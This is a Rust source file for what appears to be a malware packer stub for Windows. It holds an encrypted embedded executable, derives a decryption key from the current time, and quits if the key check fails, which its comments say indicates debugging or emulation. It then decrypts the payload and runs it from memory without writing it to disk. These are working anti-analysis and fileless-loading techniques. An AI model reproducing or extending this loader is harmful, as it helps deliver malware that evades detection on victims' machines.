#![no_main]
#![no_std]
mod loader;
use common::{crypt, get_current_bucket, key_from_bucket};
use core::ptr::addr_of_mut;
use windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE;

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

//complier *can* optimise in 2 ways that *can* break search...not use a memory address and narrow to four bytes.
#[unsafe(no_mangle)]
#[used]
#[unsafe(link_section = ".data")]
static mut PAYLOAD_SIZE: usize = 0xDEADBEEF; //magic number

const PAYLOAD_CAPACITY: usize = 1024 * 1024;
#[unsafe(link_section = ".data")]
static mut PAYLOAD_BUFFER: [u8; PAYLOAD_CAPACITY] = [0xCC; PAYLOAD_CAPACITY];

#[unsafe(no_mangle)]
pub extern "system" fn mainCRTStartup() {
    let base_bucket = get_current_bucket();

    let payload_ptr = addr_of_mut!(PAYLOAD_BUFFER) as *mut u8;
    let payload_lenght = unsafe { PAYLOAD_SIZE };

    //read memory into an array with lenght that can be modified...zero copy
    let payload_slice = unsafe { core::slice::from_raw_parts_mut(payload_ptr, payload_lenght) };

    let mut valid_key_found = false;
    let mut final_key = 0;

    let min_bucket = base_bucket.saturating_sub(2);
    let max_bucket = base_bucket + 2;

    // Iterate directly through the bucket numbers
    for candidate_bucket in min_bucket..=max_bucket {
        let candidate_key = key_from_bucket(candidate_bucket);

        // Decrypt first 2 BYTES
        let mut first_two = [payload_slice[0], payload_slice[1]];
        crypt(&mut first_two, candidate_key);

        //Check for "MZ" Signature
        let magic = u16::from_le_bytes(first_two);
        if magic == IMAGE_DOS_SIGNATURE {
            final_key = candidate_key;
            valid_key_found = true;
            break;
        }
    }

    if !valid_key_found {
        // This means we are being debugged or emulated...or the timing is way off ;-)
        return;
    }

    crypt(payload_slice, final_key);

    //execute...dont save file to disk...
    //Parse PE headers, map and to entry points
    loader::load_memory_and_execute(payload_slice);

    //should not reach here...
    panic!();
}
